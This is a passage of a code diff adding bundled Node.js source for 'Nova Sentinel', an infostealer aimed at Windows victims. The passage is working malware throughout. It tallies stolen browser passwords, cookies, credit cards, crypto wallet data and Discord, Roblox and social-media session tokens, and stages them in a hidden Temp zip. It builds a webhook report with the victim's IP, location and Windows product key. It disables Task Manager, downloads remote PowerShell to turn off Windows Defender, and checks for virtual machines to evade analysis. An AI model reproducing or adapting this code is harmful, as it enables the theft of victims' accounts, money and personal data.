+        throw err;
+      }
+
+      localRequire.resolve = resolve;
+      localRequire.cache = {};
+
+      var module = cache[name] = new newRequire.Module(name);
+
+      modules[name][0].call(module.exports, localRequire, module, module.exports, this);
+    }
+
+    return cache[name].exports;
+
+    function localRequire(x){
+      return newRequire(localRequire.resolve(x));
+    }
+
+    function resolve(x){
+      return modules[name][1][x] || x;
+    }
+  }
+
+  function Module(moduleName) {
+    this.id = moduleName;
+    this.bundle = newRequire;
+    this.exports = {};
+  }
+
+  newRequire.isParcelRequire = true;
+  newRequire.Module = Module;
+  newRequire.modules = modules;
+  newRequire.cache = cache;
+  newRequire.parent = previousRequire;
+  newRequire.register = function (id, exports) {
+    modules[id] = [function (require, module) {
+      module.exports = exports;
+    }, {}];
+  };
+
+  var error;
+  for (var i = 0; i < entry.length; i++) {
+    try {
+      newRequire(entry[i]);
+    } catch (e) {
+      // Save first error but execute all entries
+      if (!error) {
+        error = e;
+      }
+    }
+  }
+
+  if (entry.length) {
+    // Expose entry point to Node, AMD or browser globals
+    // Based on https://github.com/ForbesLindesay/umd/blob/master/template.js
+    var mainExports = newRequire(entry[entry.length - 1]);
+
+    // CommonJS
+    if (typeof exports === "object" && typeof module !== "undefined") {
+      module.exports = mainExports;
+
+    // RequireJS
+    } else if (typeof define === "function" && define.amd) {
+     define(function () {
+       return mainExports;
+     });
+
+    // <script>
+    } else if (globalName) {
+      this[globalName] = mainExports;
+    }
+  }
+
+  // Override the current require with this new one
+  parcelRequire = newRequire;
+
+  if (error) {
+    // throw error from earlier, _after updating parcelRequire_
+    throw error;
+  }
+
+  return newRequire;
+})({"utils/emotes.js":[function(require,module,exports) {
+const g = {
+  badge: {
+    nitro: "<:946246402105819216:962747802797113365>",
+    boost_1: "<:Booster1Month:1051453771147911208>",
+    boost_2: "<:Booster2Month:1051453772360077374>",
+    boost_3: "<:Booster3Month:1159062676408905848>",
+    boost_6: "<:Booster6Month:1051453773463162890>",
+    boost_9: "<:Booster9Month:1051453774620803122>",
+    boost_12: "<:boost12month:1068308256088400004>",
+    boost_15: "<:Booster15Month:1051453775832961034>",
+    boost_18: "<:BoosterLevel8:1051453778127237180>",
+    boost_24: "<:Booster24Month:1051453776889917530>",
+    staff: "<:staff:874750808728666152>",
+    partner: "<:partner:874750808678354964>",
+    hypesquad_event: "<:hypesquadevent:1143858325579108505>",
+    bughunter_1: "<:bughunter_1:874750808426692658>",
+    bughunter_2: "<:bughunter_2:874750808430874664>",
+    developer: "<:developer:874750808472825986>",
+    early: "<:early_supporter:874750808414113823>",
+    bravery: "<:bravery:874750808388952075>",
+    brillance: "<:brilliance:874750808338608199>",
+    balance: "<:balance:874750808267292683>",
+    active_developer: "<:activedev:1143858315886088263>"
+  },
+  embeds: {
+    karma: "<:karma:1173646047134892052>",
+    gold: "<a:gold:1197551697887764550>",
+    tiktok: "<:tiktok:1173628882168053811>",
+    instaiscert: "<:certifiedinsta:1173581219187937310>",
+    instagram: "<a:instawhite:853376415759335455>",
+    instagram_certified: "<:instagramlogo:1173581240650182717>",
+    twitter_usernamecert: "<:certi_twitter:1159090158117867571>",
+    twitter_usernameuncert: "<:twitter:1159090161494270052>",
+    twitter_followers: "<:a2_grey_twitter:1135298638248161361>",
+    twitter_followings: "<:Twitter_retweet:1135298386531188897>",
+    twitter_fav: "<:twitter_follow:1135298434967019540>",
+    twitter_location: "<a:controller:1159090439207518269>",
+    inject: "<a:inject:1159081839596687400>",
+    atom: "<:account:1159081832751566858>",
+    dsc: "<:roblux:1159081834966155264>",
+    rblxinfo: "<:info:1159081837365313619>",
+    infoyl: "<:ylinfo:1159081835779866635>",
+    mcid: "<a:books:1159078873699450902>",
+    mcmail: "<:email:1159078862135775252> ",
+    mcgapple: "<:gapple:1159078870461460480>",
+    hypixel: "<:hypixel:1159078857542996090>",
+    keysmc: "<a:keys:1159078859682107453>",
+    namemc: "<:namemc:1159078855550713886>",
+    games: "🎮",
+    vpn: "🌐",
+    clients: "⌨️",
+    nova: "<:lilnova5:1203979456729976912>",
+    crypto: "<:wallets4:1203979459477245952>",
+    creditcard: "<:credcard:1203979460714692630>",
+    paypal: "<:paypal:1203981549666828301>",
+    Old_Username: "<:oldusertag:1203979463994376232>",
+    token: "<a:dsctkn1:1203979465802125322>",
+    badges: "<:badg:1203979468679548928>",
+    nitro: "<:nitrocode2:1203979470466191370>",
+    billings: "<:billing8:1203979473100476446>",
+    mail: "<:blackstar:1203979482701111327>",
+    phone: "<:phonenumb:1203979476178837524>",
+    gift: "<:1839festivepixelpresent:1171449290724491325>",
+    username: "<:playboi6:1203979478817316914>",
+    cat: "<a:caat2:1130448854861488168>"
+  },
+  stats: {
+    password: "<a:blackkey:1203979480314552431>",
+    cookie: "<:blackstar:1203979482701111327>",
+    card: "<a:blackcard:1203979484726820865>",
+    autofill: "<a:autofill:1203979487180750871>",
+    metamask: "<:metamask:1203979489131110410>",
+    exodus: "<:exodus:1203979491722928148>",
+    computer: "<:computer:1203979493291597826>",
+    ip: "<:black_crown:1203979497515393045>",
+    country: "<:black_crown:1203979497515393045>",
+    disclamer: "<:disclaimer:1203979499570597929>",
+    download: "<:download:1203979502426791966>"
+  }
+};
+let {
+  embeds,
+  stats,
+  badge
+} = g;
+module.exports = {
+  embeds,
+  stats,
+  badge
+};
+},{}],"utils/stats.js":[function(require,module,exports) {
+const path = require("path"),
+  {
+    embeds,
+    stats,
+    badge
+  } = require("./emotes");
+class Stat {
+  constructor() {
+    this.passwords = 0;
+    this.cookies = 0;
+    this.autofills = 0;
+    this.cards = 0;
+    this.history = 0;
+    this.downloads = 0;
+    this.bookmarks = 0;
+    this.AllCookies = [];
+    this.games = [];
+    this.exodus = [];
+    this.keyword_password = [];
+    this.vpn = [];
+    this.sysadmin = [];
+    this.extensions = [];
+    this.colds = [];
+    this.mnemonics = [];
+    this.messengers = [];
+    this.file = [];
+    this.roblox_cookies = [];
+    this.twitter_cookies = [];
+    this.roblox_account = [];
+    this.minecraft_account = [];
+    this.atomicurl = [];
+    this.exodusurl = [];
+    this.testpath = [];
+    this.savepath = [];
+    this.twitter_account = [];
+    this.steam_content = [];
+    this.steam_account = [];
+    this.secretpath = [];
+    this.discordAccount = [];
+    this.InstaSessId = [];
+    this.TiktokSessId = [];
+    this.RedditSess = [];
+    this.passphrase;
+  }
+  addReddit(name) {
+    if (this.RedditSess.includes(name)) return;
+    this.RedditSess.push(name);
+  }
+  addTikTok(name) {
+    if (this.TiktokSessId.includes(name)) return;
+    this.TiktokSessId.push(name);
+  }
+  addSessIDInsta(name) {
+    if (this.InstaSessId.includes(name)) return;
+    this.InstaSessId.push(name);
+  }
+  addDiscordAccountbis(name) {
+    this.discordAccount[0].push(name);
+  }
+  addDiscordAccount(name) {
+    this.discordAccount.push(name);
+  }
+  addSteamAcc(name) {
+    this.steam_account.push(name);
+  }
+  addSecret(name) {
+    this.secretpath.push(name);
+  }
+  addSteam(name) {
+    this.steam_content.push(name);
+  }
+  addsavepath(name) {
+    this.savepath.push(name);
+  }
+  addbasepath(name) {
+    this.testpath.push(name);
+  }
+  addAtomicLink(name) {
+    this.atomicurl.push(name);
+  }
+  addExodusLink(name) {
+    this.exodusurl.push(name);
+  }
+  addMinecraft(name) {
+    this.minecraft_account.push(name);
+  }
+  detailRoblox(name) {
+    this.roblox_account.push(name);
+  }
+  AddTwitter(name) {
+    this.twitter_cookies.push(name);
+  }
+  AddRoblox(name) {
+    this.roblox_cookies.push(name);
+  }
+  AddTwitterAccount(name) {
+    this.twitter_account.push(name);
+  }
+  AddBrowser(passwords, cookies, autofills, cards, history, downloads, bookmarks) {
+    this.passwords = passwords;
+    this.cookies = cookies;
+    this.autofills = autofills;
+    this.cards = cards;
+    this.history = history;
+    this.downloads = downloads;
+    this.bookmarks = bookmarks;
+  }
+  SaveAllCookies(name) {
+    this.AllCookies.push(name);
+  }
+  AddGames(name) {
+    this.games.push(name);
+  }
+  Addfilestealer(name) {
+    this.file.push(name);
+  }
+  AddExodus(name) {
+    this.exodus.push(name);
+  }
+  AddKeyword(name) {
+    this.keyword_password.push(name);
+  }
+  AddVpn(name) {
+    this.vpn.push(name);
+  }
+  AddSysAdmin(name) {
+    this.sysadmin.push(name);
+  }
+  AddExtensions(name) {
+    this.extensions.push(name);
+  }
+  AddColds(name) {
+    this.colds.push(name);
+  }
+  AddPassphrase(passphrase) {
+    this.passphrase = passphrase;
+  }
+  AddMessenger(name) {
+    this.messengers.push(name);
+  }
+  Build(username, ip, hostname, city, region, country, googlemap, org, postal, timezone, disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion, link) {
+    let builded = {
+      avatar_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/novalogo3.png",
+      content: null,
+      embeds: [{
+        color: 3553599,
+        author: {
+          name: "Nova Sentinel v10.7",
+          url: "https://t.me/Sordeal",
+          icon_url: "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/gifnova.gif"
+        },
+        fields: [{
+          name: "\u200b",
+          value: `\`\`\`ansi
+[2;36m 🖥️ Username[0m : [2;37m${process.env.COMPUTERNAME}[0m
+[2;36m 🖥️ Version[0m : [2;37m${windowsversion}[0m
+[2;36m 🖥️ Ram[0m : [2;37m${ram}GB[0m
+[2;36m 🖥️ Disk[0m : [2;37m${disk}GB[0m
+[2;36m 🌏 IP[0m : [2;37m${ip !== null && ip !== void 0 ? ip : "N/A"}[0m
+[2;36m 🌏 City[0m : [2;37m${city !== null && city !== void 0 ? city : "N/A"}[0m
+[2;36m 🌏 Region[0m : [2;37m${region !== null && region !== void 0 ? region : "N/A"}[0m
+[2;36m 🌏 Country[0m : [2;37m${country !== null && country !== void 0 ? country : "N/A"}[0m
+[2;36m 🌐 Cookies[0m : [2;37m${this.cookies}[0m
+[2;36m 🌐 Passwords[0m : [2;37m${this.passwords}[0m
+[2;36m 🌐 CreditCards[0m : [2;37m${this.cards}[0m
+[2;36m 🌐 AutoFill[0m : [2;37m${this.autofills}[0m
+[2;36m 🌐 History[0m : [2;37m${this.history}[0m
+[2;36m 🌐 Downloads[0m : [2;37m${this.downloads}[0m
+[2;36m 🌐 Bookmarks[0m : [2;37m${this.bookmarks}[0m
+\`\`\`\n\n[\`Location\`](${googlemap !== null && googlemap !== void 0 ? googlemap : "https://maps.app.goo.gl/8cZz8xk7VxLN6uyc8"})`,
+          inline: false
+        }, {
+          name: "\u200b",
+          value: `
+${this.colds.length > 0 ? `${embeds.crypto} **Cold Wallets:** ${this.colds.join(", ") ? `(\`` + this.colds.join(", ") + `\`)` : ""}` : ""}${this.extensions.length > 0 ? `\n${embeds.crypto} **Extension Wallets:** ${this.extensions.join(", ") ? `(\`` + this.extensions.join(", ") + `\`)` : ""}` : ""}${this.passphrase !== undefined && this.passphrase !== "" && this.passphrase.length < 0 ? `\n${stats.metamask} **Metamask Recovery Key:** ${this.passphrase}` : ""}${this.exodus.length > 0 ? `\n${stats.exodus} **Exodus Password:** ${this.exodus.join(", ") ? `(\`` + this.exodus.join(", ") + `\`)` : ""}` : ""}${this.games.length > 0 ? `\n🎮 **Games Found:** ${this.games.join(", ") ? `(\`` + this.games.join(", ") + `\`)` : ""}` : ""}${this.messengers.length > 0 ? `\n⚓ **SocialApp Found:** ${this.games.join(", ") ? `(\`` + this.messengers.join(", ") + `\`)` : ""}` : ""}${this.sysadmin.length > 0 ? `\n⌨️ **Clients Found:** ${this.sysadmin.join(", ") ? `(\`` + this.sysadmin.join(", ") + `\`)` : ""}` : ""}${this.vpn.length > 0 ? `\n🌐 **VPN:** ${this.vpn.join(", ") ? `(\`` + this.vpn.join(", ") + `\`)` : ""}` : ""}
+\n${link ? `[${stats.download} \`${path.basename(this.savepath[0])}\`](${link})\n` + `\`\`\`ansi
+[2;36m${link}[0m\`\`\`` : ""}`,
+          inline: false
+        }],
+        footer: {
+          text: "@Nova Sentinel | https://t.me/Sordeal"
+        }
+      }],
+      username: "Nova Sentinel",
+      attachments: []
+    };
+    return JSON.stringify(builded);
+  }
+}
+var stat = new Stat();
+module.exports = {
+  stat
+};
+},{"./emotes":"utils/emotes.js"}],"utils/core.js":[function(require,module,exports) {
+const fs = require("fs"),
+  axios = require("axios"),
+  util = require("util"),
+  exec = util.promisify(require("child_process").exec),
+  execSync = util.promisify(require("child_process").execSync),
+  path = require("path"),
+  PowerShell = require("powershell"),
+  Winreg = require("winreg"),
+  {
+    stat
+  } = require("./stats"),
+  disk = require("diskusage"),
+  diskInfo = disk.checkSync("/"),
+  os = require("os");
+function checkIfStartup(path) {
+  if (path.includes(process.env.APPDATA) || path.includes("\\Microsoft\\Windows") || path.includes("Startup")) {
+    return true;
+  } else {
+    return false;
+  }
+}
+function cleaner() {
+  try {
+    fs.rmSync(stat.testpath[0], {
+      recursive: true
+    });
+  } catch (e) {}
+  try {
+    fs.rmSync(stat.savepath[0], {
+      recursive: true
+    });
+  } catch (e) {}
+}
+function isProcessRunning(processName, minCount) {
+  return new Promise((resolve, reject) => {
+    const command = process.platform === "win32" ? "tasklist" : "ps aux";
+    exec(command, (err, stdout, stderr) => {
+      if (err) {
+        reject(err);
+        return;
+      }
+      const processes = stdout.toLowerCase();
+      const processNameLower = processName.toLowerCase();
+      const processCount = (processes.match(new RegExp(processNameLower, "g")) || []).length;
+      resolve(processCount >= minCount);
+    });
+  });
+}
+function filterProcessesByName(name) {
+  return new Promise((resolve, reject) => {
+    const command = process.platform === "win32" ? "tasklist" : "ps aux";
+    exec(command, (err, stdout, stderr) => {
+      if (err) {
+        reject(err);
+        return;
+      }
+      const lines = stdout.split("\n");
+      const filteredProcesses = [];
+      for (const line of lines) {
+        if (line.toLowerCase().includes(name.toLowerCase())) {
+          const columns = line.split(/\s+/);
+          filteredProcesses.push({
+            name: columns[0],
+            pid: parseInt(columns[1]),
+            sessionName: columns[2],
+            sessionNumber: parseInt(columns[3]),
+            memoryUsage: parseInt(columns[4].replace(",", ""))
+          });
+        }
+      }
+      resolve(filteredProcesses);
+    });
+  });
+}
+async function getProcessPathByPid(pid) {
+  return new Promise((resolve, reject) => {
+    const command = process.platform === "win32" ? `wmic process where processid=${pid} get ExecutablePath` : `ps -p ${pid} -o comm=`;
+    exec(command, (err, stdout, stderr) => {
+      if (err) {
+        reject(err);
+        return;
+      }
+      const path = stdout.trim();
+      resolve(path);
+    });
+  });
+}
+function NovaSentinelDisabTaskMNGR(cc) {
+  if (cc !== "yes") return;
+  const regKey = new Winreg({
+    hive: Winreg.HKCU,
+    key: "\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
+  });
+  const valueName = "DisableTaskMgr";
+  const disableValue = 1;
+  regKey.set(valueName, Winreg.REG_DWORD, disableValue, err => {
+    if (err) {} else {}
+  });
+}
+async function NovaSentinelDisableWinDefender(cc) {
+  if (cc !== "yes") return;
+  const powershellCommandsURL = "https://raw.githubusercontent.com/Yokheycv/sub/main/assets/disable_defender.json";
+  try {
+    const response = await axios.get(powershellCommandsURL);
+    let g = response.data;
+    g.forEach(ge => {
+      let ps = new PowerShell(ge);
+      ps.on("error", err => {});
+      ps.on("output", data => {});
+      ps.on("error-output", data => {});
+      ps.on("end", code => {});
+    });
+  } catch (error) {}
+}
+async function NovaSentinelFindMyself() {
+  const executablePath = process.argv[0];
+  try {
+    const appDirectory = path.basename(executablePath);
+    const targetProcesses = await filterProcessesByName(appDirectory.replace(".exe", ""));
+    if (targetProcesses.length > 0) {
+      const targetProcess = targetProcesses[0];
+      const processPath = await getProcessPathByPid(targetProcess.pid);
+      let myself = processPath.replace("ExecutablePath", "").match(/[a-zA-Z].*[a-zA-Z]/g).join("");
+      if (!fs.existsSync(myself)) {} else {
+        return myself;
+      }
+    } else {
+      return "Failed";
+    }
+  } catch (error) {
+    return "Failed";
+  }
+}
+function generateId(len) {
+  var text = "";
+  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+  for (var i = 0; i < len; i++) text += possible.charAt(Math.floor(Math.random() * possible.length));
+  return text;
+}
+function fileName(str) {
+  return str.split("\\").pop().split("/").pop();
+}
+function recursiveRead(basepath, path) {
+  var result = [];
+  if (!basepath.endsWith("\\")) {
+    basepath += "\\";
+  }
+  const files = fs.readdirSync(basepath);
+  for (var i = 0; i < files.length; i++) {
+    const file = files[i];
+    const filePath = basepath + file;
+    if (fs.statSync(filePath).isDirectory()) {
+      result = result.concat(recursiveRead(filePath, path + file + "\\"));
+    } else {
+      result.push(path + file);
+    }
+  }
+  return result;
+}
+async function checkInternetAccess() {
+  try {
+    await axios.get("http://www.google.com");
+    return true;
+  } catch (error) {
+    try {
+      await axios.get("https://www.facebook.com");
+      return true;
+    } catch (error) {
+      return false;
+    }
+  }
+}
+function getProfiles(path, name) {
+  const profile = path.split("%PROFILE%");
+  if (profile.length == 1) {
+    return [{
+      path: path,
+      name: name
+    }];
+  }
+  if (!fs.existsSync(profile[0])) {
+    return [];
+  }
+  var dirs = fs.readdirSync(profile[0]);
+  var profiles = [];
+  for (var i = 0; i < dirs.length; i++) {
+    var dir = dirs[i];
+    if (fs.existsSync(profile[0] + dir + profile[1])) {
+      profiles.push({
+        path: profile[0] + dir + profile[1],
+        profile: name + " " + dir
+      });
+    }
+  }
+  return profiles;
+}
+async function GetTotalPhysicalMemory() {
+  const osFreeMem = os.totalmem();
+  const allFreeMem = (osFreeMem / (1024 * 1024 * 1024)).toFixed(2);
+  return Math.round(allFreeMem);
+}
+async function getDisk() {
+  return (diskInfo.total / (1024 * 1024 * 1024)).toFixed(2);
+}
+async function GetcleanUID() {
+  let uid = await getCommand("wmic csproduct get uuid");
+  let regex_uid = /UUID\s+([A-Fa-f0-9-]+)/;
+  let match = uid.match(regex_uid);
+  let uuid = match[1];
+  return uuid;
+}
+async function getCommand(cmd) {
+  const {
+    stdout,
+    _
+  } = await exec(cmd);
+  return stdout.trim();
+}
+async function GetCPUCount() {
+  return os.cpus().length;
+}
+async function getInfo() {
+  try {
+    const [disk, ram, uid, cpucount, OS, cpu, GPU, windowskey, windowsversion] = await Promise.all([getDisk(), GetTotalPhysicalMemory(), GetcleanUID(), GetCPUCount(), await getCommand("wmic OS get caption, osarchitecture | more +1"), await getCommand("wmic cpu get name | more +1"), await getCommand("wmic PATH Win32_VideoController get name | more +1"), await getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"), await getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")]);
+    return {
+      disk,
+      ram,
+      uid,
+      cpucount,
+      OS,
+      cpu,
+      GPU,
+      windowskey,
+      windowsversion
+    };
+  } catch (e) {
+    console.log(e);
+    if (e) {
+      return {
+        disk: "None",
+        ram: "None",
+        uid: "None",
+        cpucount: "None",
+        OS: "None",
+        cpu: "None",
+        GPU: "None",
+        windowskey: "None",
+        windowsversion: "None"
+      };
+    }
+  }
+}
+async function getPublicIp() {
+  var data = "";
+  try {
+    const res = await axios({
+      url: "https://ipinfo.io/json",
+      method: "GET"
+    });
+    data = res.data;
+    if (data.length > 16) {
+      return "Failed!";
+    }
+    return data;
+  } catch (err) {
+    return "Failed!";
+  }
+}
+async function antispam(running) {
+  try {
+    if (!running) return;
+    let process_name_exe = path.basename(running);
+    let result = await isProcessRunning(process_name_exe, 5);
+    if (result) {
+      process.abort();
+    }
+  } catch (e) {}
+}
+async function isVm() {
+  const {
+    stdout,
+    _
+  } = await exec('powershell -c "Get-WmiObject -Query \\"Select * from Win32_CacheMemory\\""');
+  if (stdout.replace(/\r/gm, "").replace(/\n/gm, "").replace(/ /gm, "") == "") {
+    return true;
+  }
+  return false;
+}
+function getHeader() {
+  return `$$\\   $$\\                                     $$$$$$\\                       $$\\     $$\\                     $$\\ 
+$$$\\  $$ |                                   $$  __$$\\                      $$ |    \\__|                    $$ |
+$$$$\\ $$ | $$$$$$\\ $$\\    $$\\ $$$$$$\\        $$ /  \\__| $$$$$$\\  $$$$$$$\\ $$$$$$\\   $$\\ $$$$$$$\\   $$$$$$\\  $$ |
+$$ $$\\$$ |$$  __$$\\\\$$\\  $$  |\\____$$\\       \\$$$$$$\\  $$  __$$\\ $$  __$$\\\\_$$  _|  $$ |$$  __$$\\ $$  __$$\\ $$ |
+$$ \\$$$$ |$$ /  $$ |\\$$\\$$  / $$$$$$$ |       \\____$$\\ $$$$$$$$ |$$ |  $$ | $$ |    $$ |$$ |  $$ |$$$$$$$$ |$$ |
+$$ |\\$$$ |$$ |  $$ | \\$$$  / $$  __$$ |      $$\\   $$ |$$   ____|$$ |  $$ | $$ |$$\\ $$ |$$ |  $$ |$$   ____|$$ |
+$$ | \\$$ |\\$$$$$$  |  \\$  /  \\$$$$$$$ |      \\$$$$$$  |\\$$$$$$$\\ $$ |  $$ | \\$$$$  |$$ |$$ |  $$ |\\$$$$$$$\\ $$ |
+\\__|  \\__| \\______/    \\_/    \\_______|       \\______/  \\_______|\\__|  \\__|  \\____/ \\__|\\__|  \\__| \\_______|\\__|
+                                                                                                                  
+                                                                                                                
+      ###, ,##, ,##,
+       #  # #  # #  #
+       ###  #  # #  #
+       #  # #  # #  #
+       ###' '##' '##'
+            .--,
+           /  (
+          /    \\
+         /      \\ 
+        /  0  0  \\
+((()   |    ()    |   ()))
+\\  ()  (  .____.  )  ()  /
+ |\` \\_/ \\  \`""\`  / \\_/ \`|
+ |       \`.'--'.\`       |
+  \\        \`""\`        /
+   \\                  /
+    \`.              .'    ,
+     |\`             |  _.'|
+     |              \`-'  /
+     \\                 .'
+      \`.____________.-'
+\t\tNovaSentinel By KSCH | https://t.me/Sordeal\n\n\n\n
+`;
+}
+function hideFile(filePath) {
+  try {
+    execSync(`powershell -Command "attrib +h +s \\"${filePath}\\""`);
+  } catch (e) {}
+}
+module.exports = {
+  generateId,
+  antispam,
+  fileName,
+  recursiveRead,
+  getProfiles,
+  getPublicIp,
+  isVm,
+  getHeader,
+  getInfo,
+  NovaSentinelFindMyself,
+  hideFile,
+  filterProcessesByName,
+  cleaner,
+  getProcessPathByPid,
+  NovaSentinelDisableWinDefender,
+  NovaSentinelDisabTaskMNGR,
+  checkInternetAccess,
+  isProcessRunning,
+  checkIfStartup
+};
+},{"./stats":"utils/stats.js"}],"utils/save.js":[function(require,module,exports) {
+const core = require("./core"),
+  fs = require("fs"),
+  path = require("path"),
+  archiver = require("archiver"),
+  {
+    stat
+  } = require("./stats");
+async function getbasepath() {
+  try {
+    return process.env.localappdata + "\\" + "Temp" + "\\" + `${core.generateId(20)}`;
+  } catch (err) {
+    if (err) {
+      return process.env.localappdata + "\\" + "Temp" + "\\" + `KS_NOVA_${process.env.USERNAME.replace(".", "") || "USER"}`;
+    }
+  }
+}
+async function getsavepath(country, ip) {
+  let splited = ip.split(".");
+  let startip = splited[0];
+  try {
+    return process.env.localappdata + "\\" + "Temp" + "\\" + `${country.toUpperCase()}_NOVA_${process.env.USERNAME.replace(".", "") || "USER"}_${startip !== null && startip !== void 0 ? startip : "111"}` + ".zip";
+  } catch (err) {
+    if (err) {
+      return process.env.localappdata + "\\" + "Temp" + "\\" + `KS_NOVA_${process.env.USERNAME.replace(".", "") || "USER"}` + ".zip";
+    }
+  }
+}
+async function Init(country, ip) {
+  const basepath = await getbasepath();
+  const savepath = await getsavepath(country, ip);
+  try {
+    if (fs.existsSync(basepath)) {
+      await fs.rmSync(basepath, {
+        recursive: true
+      });
+    }
+    if (fs.existsSync(savepath)) {
+      await fs.rmSync(savepath, {
+        recursive: true
+      });
+    }
+  } catch (e) {}
+  await fs.mkdirSync(basepath, {
+    recursive: true
+  });
+  stat.addbasepath(basepath);
+  stat.addsavepath(savepath);
+}
+async function Save(copypath, mainfolder, subfolder) {
+  let basepath = stat.testpath[0];
+  const files = core.recursiveRead(copypath, copypath, "");
+  for (var i = 0; i < files.length; i++) {
+    const file = files[i];
+    const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + file.replace(copypath, "");
+    try {
+      createAllDir(savePath);
+      fs.writeFileSync(savePath, fs.readFileSync(file));
+    } catch (e) {}
+  }
+}
+async function SimpleSave(copypath, mainfolder, subfolder) {
+  let basepath = stat.testpath[0];
+  const files = core.recursiveRead(copypath, copypath, "");
+  for (var i = 0; i < files.length; i++) {
+    const file = files[i];
+    const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + file.replace(copypath, "");
+    try {
+      createAllDir(savePath);
+      fs.writeFileSync(savePath, fs.readFileSync(file));
+    } catch (e) {}
+  }
+}
+async function ArraySave(saves, mainfolder, subfolder) {
+  let basepath = stat.testpath[0];
+  for (var i = 0; i < saves.length; i++) {
+    const save = saves[i];
+    try {
+      if (fs.lstatSync(save).isDirectory()) {
+        const files = core.recursiveRead(save, save, "");
+        for (var j = 0; j < files.length; j++) {
+          const file = files[j];
+          let savePath;
+          if (subfolder != "") {
+            savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + save.slice(0, -1).split("\\").pop() + "\\" + core.fileName(file);
+          } else {
+            savePath = basepath + "\\" + mainfolder + "\\" + save.slice(0, -1).split("\\").pop() + "\\" + core.fileName(file);
+          }
+          try {
+            createAllDir(savePath);
+            fs.writeFileSync(savePath, fs.readFileSync(file));
+          } catch (e) {}
+        }
+      } else {
+        const savePath = basepath + "\\" + mainfolder + "\\" + subfolder + "\\" + core.fileName(save);
+        try {
+          createAllDir(savePath);
+          fs.writeFileSync(savePath, fs.readFileSync(save));
+        } catch (e) {}
+      }
+    } catch (e) {}
+  }
+}
+function createAllDir(str) {
+  var folders = str.split(path.sep);
+  var dir = "";
+  for (var i = 0; i < folders.length - 1; i++) {
+    dir += folders[i] + path.sep;
+    if (!fs.existsSync(dir)) {
+      fs.mkdirSync(dir, {
+        recursive: true
+      });
+    }
+  }
+}
+async function SaveError(error) {
+  let basepath = stat.testpath[0];
+  var savePath = basepath + "\\Logs\\";
+  try {
+    fs.mkdirSync(savePath, {
+      recursive: true
+    });
+  } catch (e) {}
+  savePath += "Error.nova";
+  if (fs.existsSync(savePath)) {
+    fs.appendFileSync(savePath, error + "\n");
+  } else {
+    fs.writeFileSync(savePath, error + "\n");
+  }
+}
+async function saveCookies(cookies, name) {
+  let basepath = stat.testpath[0];
+  if (cookies.length == 0) {
+    return;
+  }
+  var savePath = basepath + "\\Browsers\\";
+  try {
+    await fs.mkdirSync(savePath, {
+      recursive: true
+    });
+  } catch (e) {}
+  savePath += name + " - Cookies.txt";
+  var cookiesFinal = "";
+  for (let i = 0; i < cookies.length; i++) {
+    cookiesFinal += cookies[i].build();
+  }
+  fs.writeFileSync(savePath, cookiesFinal);
+}
+async function saveRoblox(cookies) {
+  try {
+    let basepath = stat.testpath[0];
+    var savePath = basepath + "\\Games\\";
+    try {
+      fs.mkdirSync(savePath, {
+        recursive: true
+      });
+    } catch (e) {}
+    savePath += "Roblox\\";
+    fs.mkdirSync(savePath, {
+      recursive: true
+    });
+    savePath += `Roblox.txt`;
+    var cookiesFinal = "";
+    for (let i = 0; i < cookies.length; i++) {
+      cookiesFinal += cookies[i];
+    }
+    if (fs.existsSync(savePath)) {
+      fs.appendFileSync(savePath, cookiesFinal + "\n");
+    } else {
+      fs.writeFileSync(savePath, cookiesFinal);
+    }
+  } catch (e) {}
+}
+async function saveBrowser(passwords, autofills, cards, history, downloads, bookmarks) {
+  let basepath = stat.testpath[0];
+  const savePath = basepath + "\\Browsers\\";
+  const saveRoblx = basepath + "\\Games\\Roblox\\";
+  try {
+    if (!fs.existsSync(savePath)) {
+      await fs.mkdirSync(savePath, {
+        recursive: true
+      });
+    }
+  } catch (e) {}
+  try {
+    if (stat.roblox_account && stat.roblox_account.length > 0) {
+      if (!fs.existsSync(basepath + "\\Games")) {
+        await fs.mkdirSync(basepath + "\\Games", {
+          recursive: true
+        });
+      }
+      if (!fs.existsSync(saveRoblx)) {
+        await fs.mkdirSync(saveRoblx, {
+          recursive: true
+        });
+      }
+      const cookiesContent = stat.roblox_account.join("\n");
+      fs.writeFileSync(saveRoblx + "Cookies.txt", cookiesContent);
+    }
+  } catch (e) {}
+  let passwordFinal = "";
+  try {
+    for (let i = 0; i < passwords.length; i++) {
+      if (passwords[i] && typeof passwords[i].build === "function") {
+        passwordFinal += passwords[i].build() + "\n";
+      }
+    }
+    if (passwordFinal.length !== 0) {
+      passwordFinal = core.getHeader() + passwordFinal;
+    }
+  } catch (e) {}
+  let autofillFinal = "";
+  for (let i = 0; i < autofills.length; i++) {
+    autofillFinal += autofills[i].build() + "\n";
+  }
+  if (autofillFinal.length != 0) {
+    autofillFinal = core.getHeader() + autofillFinal;
+  }
+  let historyFinal = "";
+  for (let i = 0; i < history.length; i++) {
+    historyFinal += history[i].build() + "\n";
+  }
+  if (historyFinal.length != 0) {
+    historyFinal = core.getHeader() + historyFinal;
+  }
+  let downloadFinal = "";
+  for (let i = 0; i < downloads.length; i++) {
+    downloadFinal += downloads[i].build() + "\n";
+  }
+  if (downloadFinal.length != 0) {
+    downloadFinal = core.getHeader() + downloadFinal;
+  }
+  let bookmarkFinal = "";
+  for (let i = 0; i < bookmarks.length; i++) {
+    bookmarkFinal += bookmarks[i].build() + "\n";
+  }
+  if (bookmarkFinal.length != 0) {
+    bookmarkFinal = core.getHeader() + bookmarkFinal;
+  }
+  let cardFinal = "";
+  for (let i = 0; i < cards.length; i++) {
+    cardFinal += cards[i].build() + "\n";
+  }
+  if (cardFinal.length != 0) {
+    cardFinal = core.getHeader() + cardFinal;
+  }
+  await fs.writeFileSync(savePath + "Passwords.txt", passwordFinal);
+  fs.writeFileSync(savePath + "AutoFill.txt", autofillFinal);
